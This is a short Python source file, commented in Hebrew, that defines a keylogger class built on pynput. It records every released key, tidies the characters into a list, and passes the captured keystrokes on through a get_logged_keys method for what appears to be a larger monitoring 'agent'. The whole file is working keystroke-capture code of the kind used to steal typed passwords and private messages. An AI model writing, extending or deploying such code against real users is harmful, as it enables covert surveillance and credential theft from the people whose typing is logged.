import time

from pynput.keyboard import Listener
from interface_agent import IKeyLogger

class ListenerKeyboard(IKeyLogger):
    # בעת יצירת מופע יוצר אוטומטית מערך ריק, מאזין למקלדת, ובודק לפעולות בפונקציה get_logged_keys()
    def __init__(self):
        self.list = []
        self.listener = Listener(on_release=self.on_release)
        self.send = False
        self.the_final_list = []
        self.last_time_pressed = time.time()


    # מתחיל להאזין להקשות במקלדת
    def start_logging(self) -> None:
        self.listener.start()

    # עוצר את האזנה למקשים במקלדת
    def stop_logging(self) -> None:
        self.listener.stop()

    # מחזיר מערך עם את כל ההקשות במקלדת שנשמרו
    def get_logged_keys(self) -> list[str]:
        if not self.send: # מוודא שנוספו הקשות חדשות והמערך המקורי התאפס
            self.the_final_list = self.list
        else:
            self.the_final_list = []
        self.send = True
        return self.the_final_list

    # לוקח את התו שהוקש במקלדת, מסדר את התו שיהיה מסודר ושולח לפונקציה ששאחראית להכניס למערך
    def on_release(self,key):
        key = str(key).replace("'", "")
        if key == '""':
            key = "'"
        if key == "Key.space":
            key = " "
        if not key.isalpha() and not key.isnumeric() and not key == " ":
            key = ' {0} '.format(key)
        self.add_to_list(key)
        self.last_time_pressed = time.time()

    # לוקח את התו שהוקש ומכניס למערך, ובודק אם הופעלה הפונקציה get_logged_keys(), אם כן - מתאפס המערך
    def add_to_list(self,key) -> None:
        if self.send:
            self.list = []
            self.send = False
        self.list.append(key)

